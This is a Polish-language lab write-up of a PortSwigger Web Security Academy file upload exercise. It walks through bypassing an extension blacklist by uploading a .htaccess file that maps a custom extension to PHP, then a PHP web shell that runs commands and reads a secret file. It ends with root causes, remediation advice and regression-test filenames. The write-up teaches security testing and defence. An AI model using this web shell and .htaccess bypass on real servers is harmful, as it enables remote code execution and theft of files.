# PortSwigger Lab 04 - Upload web shella przez bypass blacklisty rozszerzeń

## Źródło labu

PortSwigger Web Security Academy - File upload vulnerabilities - Lab: Web shell upload via extension blacklist bypass.

## Cel

Wgrać PHP web shell i użyć go do odczytania:

```text
/home/carlos/secret
```

## Co testowałem

Najpierw wgrałem poprawny plik PNG, żeby ustalić bazowe zachowanie aplikacji.

Obserwacja:

```text
valid-image.png -> zaakceptowany
```

Aplikacja zwróciła komunikat podobny do:

```text
The file avatars/<filename>.png has been uploaded.
```

To potwierdziło, że:

- endpoint uploadu to `/my-account/avatar`
- request używał `multipart/form-data`
- pliki avatarów były serwowane z `/files/avatars/`
- normalne pliki graficzne były akceptowane

## Pierwsza próba z web shellem

Payload:

```php
<?php echo system($_GET['cmd']); ?>
```

Nazwa pliku:

```text
shell.php
```

Wynik:

```text
Sorry, php files are not allowed
Sorry, there was an error uploading your file.
```

## Początkowa hipoteza

Komunikat błędu wskazywał konkretnie na pliki `php`. To sugerowało blacklistę rozszerzeń, a nie ścisłą allowlistę obrazów.

Następne pytanie nie brzmiało tylko:

```text
Czy uda się wgrać plik?
```

Równie ważne było:

```text
Czy serwer wykona zaakceptowany plik?
```

## Test 1 - Filename w stylu null byte

Testowana nazwa:

```text
shell.php%00.php
```

Wynik:

```text
nie była użyteczna w tym labie
```

To była zła ścieżka dla tego scenariusza. Poprzedni lab z zaciemnionym rozszerzeniem opierał się na tym, że walidacja i zapis pliku inaczej interpretowały nazwę. Tutaj problemem była niepełna blacklista i zachowanie konfiguracji Apache.

## Test 2 - Alternatywne rozszerzenie podobne do PHP

Testowana nazwa:

```text
shell.php7
```

Wynik:

```text
upload zaakceptowany
```

Request:

```http
GET /files/avatars/shell.php7?cmd=whoami
```

Response:

```php
<?php echo system($_GET['cmd']); ?>
```

Kod źródłowy został zwrócony jako zwykły tekst. To pokazało, że samo zaakceptowanie uploadu nie wystarcza: w tym środowisku Apache nie wykonywał `.php7` jako PHP.

## Kluczowa obserwacja

Do remote code execution musiały być spełnione dwa warunki:

1. filtr uploadu musiał zaakceptować plik
2. serwer musiał zinterpretować uploadowany plik jako kod wykonywalny

## Test 3 - Konfiguracja Apache przez `.htaccess`

Nagłówki odpowiedzi pokazywały:

```http
Server: Apache/2.4.41 (Ubuntu)
```

Ponieważ stackiem był Apache, istotny stał się plik `.htaccess`. Jeżeli lokalne override'y są włączone, uploadowany `.htaccess` może zmienić sposób obsługi plików w danym katalogu.

Plik konfiguracyjny:

```apache
AddType application/x-httpd-php .l33t
```

Znaczenie:

```text
Traktuj pliki kończące się na .l33t jako PHP.
```

## Błąd, którego trzeba unikać

Nie należy wkładać payloadu PHP do pliku `.htaccess`.

Błędna zawartość `.htaccess`:

```apache
AddType application/x-httpd-php .l33t

<?php echo system($_GET['cmd']); ?>
```

Wynik:

```http
500 Internal Server Error
```

`.htaccess` jest plikiem konfiguracyjnym Apache, a nie plikiem PHP. Apache próbuje sparsować każdą linię jako konfigurację, więc kod PHP powoduje błąd konfiguracji.

## Poprawny flow exploita

Najpierw upload `.htaccess`:

```text
.htaccess
```

Zawartość:

```apache
AddType application/x-httpd-php .l33t
```

Następnie upload payloadu PHP jako osobnego pliku:

```text
shell.l33t
```

Zawartość:

```php
<?php echo system($_GET['cmd']); ?>
```

Test wykonania komendy:

```http
GET /files/avatars/shell.l33t?cmd=whoami
```

Zaobserwowany output:

```text
carlos
carlos
```

Output był zdublowany, ponieważ `system()` już wypisuje wynik komendy, a `echo` dodatkowo wypisuje wartość zwracaną.

Czystsze payloady:

```php
<?php system($_GET['cmd']); ?>
```

albo:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Odczyt sekretu:

```http
GET /files/avatars/shell.l33t?cmd=cat+/home/carlos/secret
```

## Co znalazłem

```text
shell.php  -> zablokowany przez filtr uploadu
shell.php7 -> wgrany, ale serwowany jako statyczny tekst
.htaccess  -> wgrany i zmienił sposób obsługi plików przez Apache
shell.l33t -> wgrany i wykonany jako PHP
```

Aplikacja blokowała `.php`, ale blacklista była niepełna. Pozwalała wgrać `.htaccess` do web-accessible katalogu avatarów. To umożliwiło zmianę zachowania Apache tak, aby niestandardowe rozszerzenie było wykonywane jako PHP.

## Przyczyna źródłowa

Przyczyną była kombinacja problemów:

- walidacja oparta na blacklistcie rozszerzeń
- niepełne blokowanie niebezpiecznych rozszerzeń związanych z PHP
- pozwolenie na upload plików konfiguracyjnych takich jak `.htaccess`
- przechowywanie uploadów w katalogu dostępnym z web root
- włączone lokalne override'y konfiguracji Apache
- możliwość wykonywania kodu po stronie serwera w katalogu uploadów

## Wpływ

Atakujący mógł:

- wgrać plik konfiguracyjny Apache
- sprawić, że Apache traktował niestandardowe rozszerzenie jako PHP
- wgrać PHP web shell z tym niestandardowym rozszerzeniem
- wykonywać komendy na serwerze
- odczytać wrażliwe pliki, np. `/home/carlos/secret`

To jest remote code execution.

## Remediacja

Aplikacja powinna:

- używać ścisłej allowlisty bezpiecznych rozszerzeń
- odrzucać `.php`, `.phtml`, `.phar`, `.php5`, `.php7`, `.pht`, `.htaccess` i inne niebezpieczne pliki
- generować nazwy plików po stronie serwera zamiast zachowywać nazwy kontrolowane przez użytkownika
- przechowywać uploady poza wykonywalnym web rootem, jeśli to możliwe
- wyłączyć wykonywanie kodu w katalogach uploadu
- wyłączyć albo ograniczyć `.htaccess` overrides tam, gdzie nie są potrzebne
- walidować zawartość pliku po stronie serwera
- serwować uploadowane pliki wyłącznie jako treść statyczną
- dodać testy regresji dla niebezpiecznych rozszerzeń i plików konfiguracyjnych

## Pomysły na testy regresji

Aplikacja powinna odrzucać albo bezpiecznie obsługiwać:

```text
shell.php
shell.php7
shell.phtml
shell.phar
shell.pht
.htaccess
shell.l33t
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
```

Powinna też weryfikować, że uploadowane pliki nie mogą zmienić konfiguracji serwera ani zostać wykonane jako kod.

## Główna lekcja

Nie polegaj na blacklistach rozszerzeń.

Testowanie uploadu musi sprawdzać obie strony zachowania:

```text
co aplikacja akceptuje
co serwer wykonuje
```
